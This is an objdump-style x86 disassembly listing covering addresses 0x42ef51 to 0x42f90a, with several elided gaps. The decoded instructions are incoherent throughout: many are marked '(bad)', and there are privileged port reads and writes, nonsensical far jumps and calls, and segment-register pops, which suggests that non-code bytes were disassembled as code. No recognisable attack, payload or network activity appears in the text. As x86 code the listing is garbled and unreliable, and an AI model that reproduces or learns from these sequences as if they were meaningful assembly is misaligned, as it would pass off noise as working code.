  42ef51:	jne    0x42eee8
  42ef53:	jne    0x42ef68
  42ef55:	pop    ebx
  42ef56:	bound  esp,QWORD PTR [ebx-0x714cb921]
  42ef5c:	fld    DWORD PTR [ebx+0x7c]
  42ef5f:	mov    ebp,0x81a847cc
  42ef64:	add    al,0xb0
  42ef66:	in     al,dx
  42ef67:	out    dx,eax
  42ef68:	pop    edx
  42ef69:	fdiv   st,st(7)
  42ef6b:	and    eax,0x260c1a05
  42ef70:	push   ss
  42ef71:	jge    0x42ef26
  42ef73:	jp     0x42efa6
  42ef75:	add    ebx,DWORD PTR [eax-0x3da935a3]
  42ef7b:	fs xchg ebx,eax
  42ef7d:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  42ef7f:	xchg   esp,eax
  42ef80:	jge    0x42efb1
  42ef82:	jmp    0xbdd618b5
  42ef87:	lahf   
  42ef88:	or     DWORD PTR [eax+eiz*2],esp
  42ef8b:	enter  0xd997,0xf3
  42ef8f:	addr16 out 0x2d,al
  42ef92:	ins    BYTE PTR es:[edi],dx
  42ef93:	sub    ebx,DWORD PTR [esi-0x3c]
  42ef96:	cmp    BYTE PTR [ecx],bh
  42ef98:	add    bh,BYTE PTR [esi+0x5ab59da5]
  42ef9e:	jl     0x42ef6a
  42efa0:	sub    eax,0xd7fa3dbb
  42efa5:	cs pop ds
  42efa7:	dec    edi
  42efa8:	push   edx
  42efa9:	mov    eax,0x22f54a2f
  42efae:	jge    0x42ef97
  42efb0:	and    eax,0x96ac4ea1
  42efb5:	sub    bl,BYTE PTR [edi+0x6d76988e]
  42efbb:	ficomp DWORD PTR [eax-0x4cd449b]
  42efc1:	shl    BYTE PTR [edi],cl
  42efc3:	in     eax,dx
  42efc4:	sbb    DWORD PTR [edx-0x2e],ebp
  42efc7:	inc    eax
  42efc8:	cmp    ebx,DWORD PTR [ebx+0x231584a]
  42efce:	xchg   edx,eax
  42efcf:	dec    ebp
  42efd0:	dec    ecx
  42efd1:	push   ds
  42efd2:	test   eax,0x186fb146
  42efd7:	lock es xchg ebp,eax
  42efda:	xor    esi,DWORD PTR [ebx-0x1d]
  42efdd:	in     al,dx
  42efde:	clc    
  42efdf:	int3   
  42efe0:	enter  0xbe4d,0x88
  42efe4:	call   0x6960:0x9e1a2334
  42efeb:	mov    bl,cl
  42efed:	cmp    BYTE PTR [esi],ch
  42efef:	repz daa 
  42eff1:	mov    bl,0xca
  42eff3:	inc    ecx
  42eff4:	dec    eax
  42eff5:	aam    0xdd
  42eff7:	dec    esi
  42eff8:	cmp    eax,0x929ce5c4
  42effd:	jmp    0x42f011
  42efff:	or     esp,DWORD PTR [edi+0x4d]
  42f002:	(bad)  
  42f003:	mov    ch,0xf1
  42f005:	shr    bh,0x9b
  42f008:	fdivrp st(3),st
  42f00a:	mov    bh,0xb4
  42f00c:	pop    ss
  42f00d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f00e:	aam    0x6e
  42f010:	cdq    
	...
  42f071:	add    BYTE PTR [eax],al
  42f073:	add    BYTE PTR [edx],dl
  42f075:	ds int 0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	stos   BYTE PTR es:[edi],al
  42f081:	repnz push ds
  42f083:	clc    
  42f084:	cmp    eax,0x1050001
  42f08a:	add    BYTE PTR [eax],al
  42f08c:	pop    eax
  42f08d:	or     al,0xa2
  42f08f:	mov    edx,0xeb3b52f4
  42f094:	clc    
  42f095:	jne    0x42f0f8
  42f097:	in     al,0xd2
  42f099:	dec    ebp
  42f09a:	mov    edi,0xe200ea71
  42f09f:	dec    DWORD PTR [ecx-0x12]
  42f0a2:	test   DWORD PTR [ebx],edi
  42f0a4:	mov    al,0x5e
  42f0a6:	sbb    eax,0x1f32e81f
  42f0ab:	dec    eax
  42f0ac:	sub    al,0x71
  42f0ae:	and    al,0xe4
  42f0b0:	(bad)  [ebp-0x64bcc515]
  42f0b6:	and    ebx,DWORD PTR [ebx]
  42f0b8:	out    0x62,al
  42f0ba:	fistp  WORD PTR [ebx]
  42f0bc:	ror    DWORD PTR [edi-0xa],1
  42f0bf:	push   esp
  42f0c0:	gs jge 0x42f0b3
  42f0c3:	sbb    eax,0x44a07943
  42f0c8:	cmp    ah,cl
  42f0ca:	aaa    
  42f0cb:	or     eax,0x152edb20
  42f0d0:	xchg   BYTE PTR [esi+0x1792987a],al
  42f0d6:	pushf  
  42f0d7:	imul   ebx,DWORD PTR [edi],0xfffffffa
  42f0da:	rcr    DWORD PTR [ecx],cl
  42f0dc:	cmc    
  42f0dd:	lock dec eax
  42f0df:	inc    ebp
  42f0e0:	jecxz  0x42f0cb
  42f0e2:	retf   0x790f
  42f0e5:	xchg   ebx,eax
  42f0e6:	popf   
  42f0e7:	in     eax,0xc3
  42f0e9:	dec    esi
  42f0ea:	mov    al,ds:0xbad99fc4
  42f0ef:	int3   
  42f0f0:	out    dx,eax
  42f0f1:	fbld   TBYTE PTR [eax]
  42f0f3:	ins    DWORD PTR es:[edi],dx
  42f0f4:	(bad)  
  42f0f5:	scas   eax,DWORD PTR es:[edi]
  42f0f6:	repnz ficom DWORD PTR [ebp-0x40]
  42f0fa:	add    BYTE PTR ds:0x7ce74498,al
  42f100:	add    al,0x6e
  42f102:	ins    DWORD PTR es:[edi],dx
  42f103:	cmp    BYTE PTR [ebx-0x6e93c06c],dh
  42f109:	pop    ds
  42f10a:	addr16 push ds
  42f10c:	xchg   esp,eax
  42f10d:	mov    edi,0x78fec8b9
  42f112:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f113:	shl    ecx,1
  42f115:	sbb    edx,DWORD PTR [eax+edx*8]
  42f118:	stos   DWORD PTR es:[edi],eax
  42f119:	dec    edx
  42f11a:	or     eax,0xbf79dd7e
  42f11f:	lock fidivr DWORD PTR [edi]
  42f122:	mov    eax,ds:0x1ff56a1
  42f127:	jo     0x42f142
  42f129:	fmul   DWORD PTR [eax]
  42f12b:	lods   al,BYTE PTR ds:[esi]
  42f12c:	scas   eax,DWORD PTR es:[edi]
  42f12d:	imul   esi,DWORD PTR [ebx],0xd9d57161
  42f133:	call   FWORD PTR [ecx]
  42f135:	pop    ss
  42f136:	ins    DWORD PTR es:[edi],dx
  42f137:	jmp    0x42f0fb
  42f139:	(bad)  
  42f13b:	push   ebp
  42f13c:	out    0xcd,al
  42f13e:	sub    BYTE PTR [esp+ebp*2+0x71],cl
  42f142:	jae    0x42f16b
  42f144:	xchg   esi,eax
  42f145:	pop    esp
  42f146:	outs   dx,DWORD PTR ds:[esi]
  42f147:	jecxz  0x42f17a
  42f149:	enter  0xa248,0x1d
  42f14d:	out    dx,eax
  42f14e:	aaa    
  42f14f:	dec    edx
  42f150:	and    BYTE PTR [edx+0x75f128b1],0x60
  42f157:	pop    ebx
  42f158:	mov    ah,0x18
  42f15a:	(bad)
  42f15d:	js     0x42f15a
  42f15f:	xchg   esp,eax
  42f160:	add    bl,BYTE PTR [edi+0x1a]
  42f163:	mov    ebp,0x215afcbe
  42f168:	ins    BYTE PTR es:[edi],dx
  42f169:	xor    al,0xaa
  42f16b:	pop    edi
  42f16c:	push   esp
  42f16d:	retf   0x84ff
  42f170:	jmp    0x5621:0x3d92fb56
  42f177:	dec    edi
  42f178:	inc    ecx
  42f179:	dec    BYTE PTR [esi+edx*1-0x59]
  42f17d:	push   esi
  42f17e:	and    esp,eax
  42f180:	and    edx,DWORD PTR [edi+ebx*1]
  42f183:	cs repz cmp eax,0x7a9a2b11
  42f18a:	loopne 0x42f176
  42f18c:	call   0x3632dd57
	...
  42f1f1:	add    BYTE PTR [eax],al
  42f1f3:	add    BYTE PTR [edx+0x26],bl
  42f1f6:	jecxz  0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	cdq    
  42f201:	jle    0x42f23d
  42f203:	push   esi
  42f204:	xchg   cl,bh
  42f206:	add    DWORD PTR [eax],eax
  42f208:	add    eax,0xd000001
  42f20d:	rol    BYTE PTR [edi-0x510ec9ec],cl
  42f213:	jno    0x42f215
  42f215:	int    0xe8
  42f217:	ret    
  42f218:	add    BYTE PTR [edx],ah
  42f21a:	xor    DWORD PTR [esi+0xf],0x3c1244ed
  42f221:	mov    edx,0x2960da0c
  42f226:	mov    edi,0xacba1ac6
  42f22b:	jbe    0x42f1dc
  42f22d:	mov    ds:0x2ec30d2d,eax
  42f232:	or     dl,BYTE PTR [edx+0x55ad3c4]
  42f238:	sbb    DWORD PTR [eax],esi
  42f23a:	mov    ebp,DWORD PTR [ebp+0x6f]
  42f23d:	cmp    edi,DWORD PTR [ebp-0x5a900b44]
  42f243:	mov    eax,edx
  42f245:	jp     0x42f202
  42f247:	call   0x1388b24
  42f24c:	lea    eax,[eax+0x5d]
  42f24f:	outs   dx,BYTE PTR ds:[esi]
  42f250:	(bad)  
  42f251:	mov    dl,0x66
  42f253:	lea    esp,[esi-0x49a17359]
  42f259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f25a:	pop    ss
  42f25b:	test   al,0xd3
  42f25d:	mov    eax,0x57b386b
  42f262:	mov    ds:0x4c94eb8,eax
  42f267:	ret    
  42f268:	sub    esi,esp
  42f26a:	adc    eax,0x8ab6c3f7
  42f26f:	lea    eax,[edx+0x20]
  42f272:	pop    es
  42f273:	jle    0x42f238
  42f275:	dec    edx
  42f276:	(bad)  
  42f277:	xchg   edx,eax
  42f278:	cmova  ebp,DWORD PTR [eax]
  42f27b:	fmul   DWORD PTR [edi+ebp*1+0x1d]
  42f27f:	mov    al,ds:0x96c4265c
  42f284:	hlt    
  42f285:	pop    edx
  42f286:	push   esp
  42f287:	call   0x5d798173
  42f28c:	adc    eax,DWORD PTR [ebx+0x12]
  42f28f:	and    al,0x6
  42f291:	call   0x8a732c9c
  42f296:	pop    ds
  42f297:	xchg   edi,eax
  42f298:	mov    dh,0xb5
  42f29a:	retf   
  42f29b:	outs   dx,DWORD PTR ds:[esi]
  42f29c:	push   es
  42f29d:	aas    
  42f29e:	push   ss
  42f29f:	xlat   BYTE PTR ds:[ebx]
  42f2a0:	jge    0x42f2b7
  42f2a2:	call   0x4c848d8f
  42f2a7:	dec    ecx
  42f2a8:	mov    dh,0x92
  42f2aa:	inc    eax
  42f2ab:	inc    ebp
  42f2ac:	in     al,0x13
  42f2ae:	cmp    al,0x1c
  42f2b0:	stos   DWORD PTR es:[edi],eax
  42f2b1:	and    ecx,DWORD PTR [ebx+0x3aa8bee0]
  42f2b7:	mov    dh,0x3b
  42f2b9:	push   edx
  42f2ba:	fiadd  WORD PTR [esi-0x27]
  42f2bd:	mov    ch,0x3a
  42f2bf:	out    0x6b,eax
  42f2c1:	pop    ebx
  42f2c2:	dec    eax
  42f2c3:	sub    al,0x55
  42f2c5:	fbstp  TBYTE PTR [ebx-0x41]
  42f2c8:	arpl   cx,sp
  42f2ca:	lods   eax,DWORD PTR ds:[esi]
  42f2cb:	rol    edx,cl
  42f2cd:	pop    esi
  42f2ce:	mov    ebp,0xdeb7248e
  42f2d3:	and    BYTE PTR [eax-0x7b],ch
  42f2d6:	mov    esi,0xbba8db8
  42f2db:	and    bl,BYTE PTR [ebx+0x1a]
  42f2de:	aas    
  42f2df:	loopne 0x42f360
  42f2e1:	adc    dl,cl
  42f2e3:	sub    al,0x45
  42f2e5:	pop    esp
  42f2e6:	sar    DWORD PTR [ecx+eax*2-0x62],cl
  42f2ea:	in     eax,dx
  42f2eb:	out    dx,eax
  42f2ec:	fnsave [edi]
  42f2ee:	xor    ecx,DWORD PTR [ebx+eax*1]
  42f2f1:	mov    WORD PTR [eax-0x16330649],?
  42f2f7:	and    BYTE PTR [edi+0x35],bl
  42f2fa:	pop    ecx
  42f2fb:	jg     0x42f33e
  42f2fd:	lock sub eax,0x6cf3205c
  42f303:	repz daa 
  42f305:	push   ebp
  42f306:	dec    edx
  42f307:	cdq    
  42f308:	pop    edx
  42f309:	bound  eax,QWORD PTR [ebx+0x29]
  42f30c:	jmp    0x0:0x260effd6
	...
  42f373:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	jmp    0x1fa:0x8b693fcb
  42f387:	add    BYTE PTR ds:0xbb000001,al
  42f38d:	les    esi,FWORD PTR [eax+0x48604e1]
  42f393:	mov    esi,0x7f4d3dd7
  42f398:	mov    eax,0xe45d063
  42f39d:	call   0x6ed77102
  42f3a2:	xor    al,0x2e
  42f3a4:	into   
  42f3a5:	leave  
  42f3a6:	pop    ebx
  42f3a7:	add    BYTE PTR ds:0x24cc5fef,dh
  42f3ad:	pushf  
  42f3ae:	xor    dh,BYTE PTR [ecx]
  42f3b0:	(bad)  
  42f3b2:	bound  ebx,QWORD PTR [esi-0x20]
  42f3b5:	loope  0x42f399
  42f3b7:	ss std 
  42f3b9:	rol    BYTE PTR [edx+0x65],1
  42f3bc:	rol    DWORD PTR [ecx],0x26
  42f3bf:	sub    ebx,DWORD PTR [edi+0x17]
  42f3c2:	inc    ebp
  42f3c3:	stos   BYTE PTR es:[edi],al
  42f3c4:	lods   al,BYTE PTR ds:[esi]
  42f3c5:	leave  
  42f3c6:	sbb    cl,BYTE PTR [edi-0x7bfee107]
  42f3cc:	and    DWORD PTR [ecx+eiz*1+0x19],ecx
  42f3d0:	jns    0x42f3e5
  42f3d2:	shl    eax,cl
  42f3d4:	mov    esi,0x74c1f27f
  42f3d9:	gs sahf 
  42f3db:	retf   
  42f3dc:	adc    eax,0x2ee31ffb
  42f3e1:	retf   
  42f3e2:	pusha  
  42f3e3:	adc    bh,0x2e
  42f3e6:	add    ebp,DWORD PTR [esi-0x23]
  42f3e9:	(bad)  
  42f3ea:	fistp  DWORD PTR [ebp+0x74]
  42f3ed:	pop    eax
  42f3ee:	sbb    bh,al
  42f3f0:	mov    esp,0x8a1efd1c
  42f3f5:	pop    edx
  42f3f6:	cmc    
  42f3f7:	xchg   ebx,eax
  42f3f8:	leave  
  42f3f9:	jb     0x42f37e
  42f3fb:	jecxz  0x42f390
  42f3fd:	pusha  
  42f3fe:	pop    ebx
  42f3ff:	push   0xb8481290
  42f404:	mov    dh,0x21
  42f406:	outs   dx,DWORD PTR ds:[esi]
  42f407:	dec    edx
  42f408:	sub    BYTE PTR [edx],dl
  42f40a:	repz sub BYTE PTR [eax-0x54],dl
  42f40e:	in     eax,0x74
  42f410:	stos   DWORD PTR es:[edi],eax
  42f411:	mov    esp,0x935d6606
  42f416:	mov    esp,0x5c5d0a9e
  42f41b:	sbb    BYTE PTR [edx+0x3925096b],bh
  42f421:	loopne 0x42f441
  42f423:	jmp    0x52a7:0x700241cf
  42f42a:	push   ebp
  42f42b:	jb     0x42f4a8
  42f42d:	fistp  WORD PTR [edx-0x12]
  42f430:	sub    eax,0xd66c7516
  42f435:	test   BYTE PTR ds:[eax+0x593971f2],cl
  42f43c:	scas   eax,DWORD PTR es:[edi]
  42f43d:	int3   
  42f43e:	dec    ebx
  42f43f:	test   ch,ah
  42f441:	mov    ss,WORD PTR [esi]
  42f443:	mov    ebp,0x1801ec6a
  42f448:	jbe    0x42f406
  42f44a:	call   0xd2d4:0x97aa280e
  42f451:	popa   
  42f452:	in     eax,0x49
  42f454:	pop    esp
  42f455:	cmp    ah,dl
  42f457:	push   edx
  42f458:	sahf   
  42f459:	xchg   dl,al
  42f45b:	xor    ch,BYTE PTR [eax+0x65d5eabc]
  42f461:	ret    0x4db7
  42f464:	mov    ds:0x933c99cb,al
  42f469:	mov    esp,0xd49ab0b1
  42f46e:	arpl   cx,bp
  42f470:	pop    edi
  42f471:	jo     0x42f449
  42f473:	inc    edi
  42f474:	adc    al,0x8d
  42f476:	and    DWORD PTR [ebp-0x16f410e3],ebx
  42f47c:	xor    eax,0xe3116169
  42f481:	mov    bl,0xbf
  42f483:	xor    BYTE PTR [eax],bl
  42f485:	fcomp  DWORD PTR [edi+0x51]
  42f488:	inc    ebp
  42f489:	pop    ebp
  42f48a:	jno    0x42f4d7
  42f48c:	jmp    DWORD PTR [ecx+0x17ae9d]
	...
  42f4f2:	add    BYTE PTR [eax],al
  42f4f4:	aaa    
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	mov    ch,BYTE PTR [edx-0x46f858d]
  42f506:	add    DWORD PTR [eax],eax
  42f508:	add    eax,0xb2000001
  42f50d:	ret    
  42f50e:	sahf   
  42f50f:	and    ecx,edi
  42f511:	into   
  42f512:	enter  0xa98c,0x2
  42f516:	add    ebx,0x3411099b
  42f51c:	cmp    eax,0x3b9ea4ba
  42f521:	cmp    eax,0xce065a3a
  42f526:	ds jle 0x42f4e4
  42f529:	add    ebx,DWORD PTR [eax-0x29]
  42f52c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f52d:	add    DWORD PTR [edi+0x14],ecx
  42f530:	mov    eax,ds:0x480c619d
  42f535:	wbinvd 
  42f537:	pop    ds
  42f538:	mov    WORD PTR [ebx],es
  42f53a:	ins    DWORD PTR es:[edi],dx
  42f53b:	push   0xffffffca
  42f53d:	scas   al,BYTE PTR es:[edi]
  42f53e:	dec    eax
  42f53f:	adc    BYTE PTR [ecx-0x2fcc1598],ch
  42f545:	idiv   esp
  42f547:	or     ah,dh
  42f549:	inc    eax
  42f54a:	test   bl,bh
  42f54c:	inc    edx
  42f54d:	call   0x3a8dfb0
  42f552:	fist   WORD PTR [esp+ebp*2-0x61519eb9]
  42f559:	xor    BYTE PTR [eax+0x33],dl
  42f55c:	imul   ebp,DWORD PTR [edx],0x28750090
  42f562:	jb     0x42f598
  42f564:	in     al,0xf7
  42f566:	xchg   esp,eax
  42f567:	mov    al,ds:0x2a833e10
  42f56c:	mov    edx,DWORD PTR [edx*4-0x3999712e]
  42f573:	xchg   ebx,eax
  42f574:	xor    eax,0x6277f485
  42f579:	adc    ebp,ecx
  42f57b:	stos   DWORD PTR es:[edi],eax
  42f57c:	pop    edi
  42f57d:	push   0x3b
  42f57f:	imul   esi,DWORD PTR [esi],0xffffffb4
  42f582:	pop    esi
  42f583:	das    
  42f584:	add    dh,bl
  42f586:	sub    BYTE PTR [eax+edx*4+0xdd3dbed],0xf0
  42f58e:	xchg   esi,eax
  42f58f:	mov    dl,BYTE PTR [edx-0x6f58a88]
  42f595:	std    
  42f596:	adc    eax,0x20aaf9b2
  42f59b:	xchg   DWORD PTR [esi+0x13f0e8f5],esi
  42f5a1:	push   0x61
  42f5a3:	nop
  42f5a4:	rol    BYTE PTR [ebx+0x1ba791fd],0x9a
  42f5ab:	or     DWORD PTR [ebp+0x30],edx
  42f5ae:	jle    0x42f5e3
  42f5b0:	pop    esp
  42f5b1:	ds retf 0x3f18
  42f5b5:	int    0x26
  42f5b7:	pop    edx
  42f5b8:	fcomi  st,st(5)
  42f5ba:	test   al,0x3b
  42f5bc:	aas    
  42f5bd:	push   DWORD PTR [eax]
  42f5bf:	lock int3 
  42f5c1:	lods   al,BYTE PTR ds:[esi]
  42f5c2:	je     0x42f624
  42f5c4:	mov    edx,0x1a5a1e07
  42f5c9:	(bad)  [esp+edx*2+0x6f]
  42f5cd:	loop   0x42f617
  42f5cf:	pop    esi
  42f5d0:	or     al,dh
  42f5d2:	push   0x42aa6f4e
  42f5d7:	lds    ebp,FWORD PTR [edi-0x63]
  42f5da:	add    al,0x55
  42f5dc:	dec    ebp
  42f5dd:	fsub   QWORD PTR [edx]
  42f5df:	rcl    DWORD PTR ds:0x985829f3,cl
  42f5e5:	stos   DWORD PTR es:[edi],eax
  42f5e6:	mov    cl,0x54
  42f5e8:	loope  0x42f5d0
  42f5ea:	mov    ah,BYTE PTR [edi+ecx*4]
  42f5ed:	sbb    DWORD PTR [ebx+edx*2+0x2ebaeb82],edi
  42f5f4:	inc    esi
  42f5f5:	dec    edx
  42f5f6:	sbb    cl,dl
  42f5f8:	jb     0x42f5f3
  42f5fa:	sub    DWORD PTR [eax],edx
  42f5fc:	jbe    0x42f5da
  42f5fe:	nop
  42f5ff:	adc    BYTE PTR [edi+edi*1],dh
  42f602:	adc    ebp,eax
  42f604:	in     eax,dx
  42f605:	mov    esi,0xa1a3c469
  42f60a:	outs   dx,DWORD PTR ds:[esi]
  42f60b:	(bad)  
  42f60c:	inc    ecx
  42f60d:	in     al,dx
  42f60e:	mov    WORD PTR [eax+0x9c],cs
	...
  42f674:	ds push esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	test   eax,0x95113159
  42f685:	cld    
  42f686:	add    DWORD PTR [eax],eax
  42f688:	add    eax,0x55000001
  42f68d:	stc    
  42f68e:	push   0xdbccfe75
  42f693:	(bad)  
  42f695:	(bad)  
  42f696:	jbe    0x42f6e9
  42f698:	(bad)  
  42f69a:	mov    ebp,0xb2074a6
  42f69f:	aad    0xde
  42f6a1:	jae    0x42f6c3
  42f6a3:	mov    dl,ch
  42f6a5:	or     eax,0x2d7c49c3
  42f6aa:	loope  0x42f637
  42f6ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f6ad:	pop    esi
  42f6ae:	ret    
  42f6af:	pop    ebx
  42f6b0:	pop    edx
  42f6b1:	add    al,0x68
  42f6b3:	lods   al,BYTE PTR ds:[esi]
  42f6b4:	pop    ds
  42f6b5:	lods   al,BYTE PTR ds:[esi]
  42f6b6:	shl    DWORD PTR [ecx+0x13fd9a38],0xc0
  42f6bd:	scas   al,BYTE PTR es:[edi]
  42f6be:	xchg   BYTE PTR [ebx+ecx*8-0x5f01ab0a],dh
  42f6c5:	xor    ah,cl
  42f6c7:	addr16 popa 
  42f6c9:	retf   
  42f6ca:	inc    BYTE PTR [esi-0x67]
  42f6cd:	jecxz  0x42f6a1
  42f6cf:	mov    WORD PTR [esi],ss
  42f6d1:	lahf   
  42f6d2:	(bad)  
  42f6d3:	dec    ecx
  42f6d4:	push   ss
  42f6d5:	jmp    0x7287:0xbad84320
  42f6dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f6dd:	retf   0xc029
  42f6e0:	push   esi
  42f6e1:	and    eax,0x4b7c9411
  42f6e6:	dec    edi
  42f6e7:	inc    esi
  42f6e8:	leave  
  42f6e9:	into   
  42f6ea:	(bad)  
  42f6ec:	mov    WORD PTR [eax+0x6fd598dc],cs
  42f6f2:	adc    eax,0x625ce19d
  42f6f7:	mov    esp,0xc078a290
  42f6fc:	ja     0x42f689
  42f6fe:	clc    
  42f6ff:	mov    ch,0xc1
  42f701:	jb     0x42f6c1
  42f703:	push   ecx
  42f704:	icebp  
  42f705:	in     eax,0xa5
  42f707:	adc    BYTE PTR [esi+0x22ab04df],al
  42f70d:	call   0x28655a6a
  42f712:	sub    ch,BYTE PTR [eax]
  42f714:	mov    BYTE PTR [ebx+0x5],ah
  42f717:	jmp    0x85e5ee43
  42f71c:	push   ds
  42f71d:	xor    bh,bh
  42f71f:	mov    cl,0x42
  42f721:	jl     0x42f770
  42f723:	add    dh,cl
  42f725:	mov    bh,BYTE PTR [edi]
  42f727:	arpl   WORD PTR [ecx+0x7d50f230],cx
  42f72d:	sub    BYTE PTR [edx+0x4e],ch
  42f730:	icebp  
  42f731:	jle    0x42f762
  42f733:	push   eax
  42f734:	jb     0x42f6cf
  42f736:	dec    ecx
  42f737:	ror    BYTE PTR [edx+0x6a],0xce
  42f73b:	hlt    
  42f73c:	mov    BYTE PTR [ecx-0x32],ah
  42f73f:	je     0x42f700
  42f741:	mov    dh,0xe7
  42f743:	bound  esp,QWORD PTR ds:0x934f718
  42f749:	lahf   
  42f74a:	fmul   DWORD PTR [edi+edx*8]
  42f74d:	dec    esp
  42f74e:	repnz push 0x19e6c87f
  42f754:	lock xor edx,edx
  42f757:	pusha  
  42f758:	leave  
  42f759:	mov    ebx,0x1ad27802
  42f75e:	mov    dh,0xb
  42f760:	jo     0x42f769
  42f762:	fidivr WORD PTR [edi]
  42f764:	cli    
  42f765:	es mov edi,0xf052842
  42f76b:	(bad)  
  42f76c:	push   ebx
  42f76d:	fmul   st(1),st
  42f76f:	popa   
  42f770:	(bad)  
  42f771:	adc    al,0xe2
  42f773:	and    al,0x9c
  42f775:	mov    DWORD PTR [ebx+0x35c6e93a],ecx
  42f77b:	mov    eax,0xc83bcd86
  42f780:	(bad)  
  42f781:	jl     0x42f72c
  42f783:	and    bh,BYTE PTR fs:[edx-0x4f]
  42f787:	fwait
  42f788:	jne    0x42f74b
  42f78a:	loope  0x42f742
  42f78c:	(bad)  
  42f78d:	adc    edi,DWORD PTR [eax+0x47]
  42f790:	mov    ecx,0x0
	...
  42f7f1:	add    BYTE PTR [eax],al
  42f7f3:	add    BYTE PTR [ecx-0x5f],dh
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0xfead8b9c
  42f804:	call   0x1:0x50001fd
  42f80b:	add    BYTE PTR ds:0xeae9eeb9,ch
  42f811:	or     BYTE PTR [ecx],dl
  42f813:	es (bad) 
  42f816:	jo     0x42f81f
  42f818:	pop    eax
  42f819:	mov    BYTE PTR [edx],bl
  42f81b:	imul   esi,DWORD PTR [ebx],0x6f3b2b9d
  42f821:	ror    DWORD PTR ss:0xd2098262,0x51
  42f829:	cs in  al,dx
  42f82b:	xor    ecx,ebx
  42f82d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f82e:	inc    edi
  42f82f:	mov    edx,0x458a2d94
  42f834:	pushf  
  42f835:	xchg   esi,eax
  42f836:	hlt    
  42f837:	xor    dh,BYTE PTR [edx+0x24ed2480]
  42f83d:	sub    DWORD PTR [ebp+0x65],ecx
  42f840:	and    DWORD PTR [ebp-0x15],ebp
  42f843:	aaa    
  42f844:	push   esi
  42f845:	pop    ecx
  42f846:	int    0x26
  42f848:	retf   0xb711
  42f84b:	in     al,0x49
  42f84d:	add    BYTE PTR [esi-0x16],bh
  42f850:	aad    0x23
  42f852:	ret    
  42f853:	jbe    0x42f86a
  42f855:	push   edi
  42f856:	jne    0x42f855
  42f858:	loope  0x42f852
  42f85a:	sbb    eax,ebx
  42f85c:	and    al,0xd0
  42f85e:	les    eax,FWORD PTR [edi+ecx*2]
  42f861:	icebp  
  42f862:	or     ecx,DWORD PTR [ecx+edx*1-0x5f7aad88]
  42f869:	xchg   ebx,eax
  42f86a:	cmp    BYTE PTR [edi-0x25],bh
  42f86d:	scas   al,BYTE PTR es:[edi]
  42f86e:	clc    
  42f86f:	imul   edi,DWORD PTR [edi+ebp*2+0xa041312],0x21
  42f877:	lds    ebx,FWORD PTR [edx]
  42f879:	or     BYTE PTR [edx],dl
  42f87b:	jl     0x42f836
  42f87d:	lods   eax,DWORD PTR ds:[esi]
  42f87e:	pusha  
  42f87f:	ficom  DWORD PTR [ebx+0x60]
  42f882:	outs   dx,DWORD PTR ds:[esi]
  42f883:	fnstenv [ecx-0x5c]
  42f886:	cmp    al,0xd1
  42f888:	mov    cl,dl
  42f88a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f88b:	aas    
  42f88c:	das    
  42f88d:	fs cmp eax,0xfff83eb9
  42f893:	xchg   ebx,eax
  42f894:	fs hlt 
  42f896:	scas   eax,DWORD PTR es:[edi]
  42f897:	xlat   BYTE PTR ds:[ebx]
  42f898:	mov    ah,BYTE PTR [ebx]
  42f89a:	xor    ch,BYTE PTR [ebx+0x81d4f82]
  42f8a0:	xchg   ch,dl
  42f8a2:	dec    ebp
  42f8a3:	pop    ebx
  42f8a4:	adc    dl,BYTE PTR [edi]
  42f8a6:	punpckldq mm7,DWORD PTR [eax-0x4b54b3bd]
  42f8ad:	mov    ebp,0x3b3e90ab
  42f8b2:	sub    cl,dh
  42f8b4:	jecxz  0x42f84f
  42f8b6:	fld    TBYTE PTR [esi+0x54]
  42f8b9:	imul   ebp,DWORD PTR [esi],0x2236bdb0
  42f8bf:	dec    edi
  42f8c0:	les    ecx,FWORD PTR [ebx+0x6c6cb56c]
  42f8c6:	mov    al,ds:0xf14385c3
  42f8cb:	pop    ecx
  42f8cc:	stos   BYTE PTR es:[edi],al
  42f8cd:	mov    ebx,0x68785668
  42f8d2:	pop    edi
  42f8d3:	inc    ebx
  42f8d4:	(bad)  
  42f8d6:	sbb    al,BYTE PTR [edi-0x3]
  42f8d9:	dec    ecx
  42f8da:	or     edi,DWORD PTR [ebp+eax*4+0xb]
  42f8de:	repnz scas al,BYTE PTR es:[edi]
  42f8e0:	fwait
  42f8e1:	ja     0x42f8d9
  42f8e3:	(bad)  
  42f8e4:	adc    ch,dh
  42f8e6:	xchg   ebp,eax
  42f8e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f8e8:	add    BYTE PTR [ecx+0x6651aa1e],bh
  42f8ee:	jo     0x42f8cb
  42f8f0:	(bad)  
  42f8f1:	xor    BYTE PTR [esi],al
  42f8f3:	iret   
  42f8f4:	mov    WORD PTR [edx-0x50d0d3a1],?
  42f8fa:	aad    0x67
  42f8fc:	xchg   BYTE PTR [ebx-0x4],al
  42f8ff:	push   edi
  42f900:	push   ecx
  42f901:	adc    ecx,DWORD PTR [edi-0x3d]
  42f904:	fadd   DWORD PTR [edi+0x7ad2f7f3]
  42f90a:	inc    eax
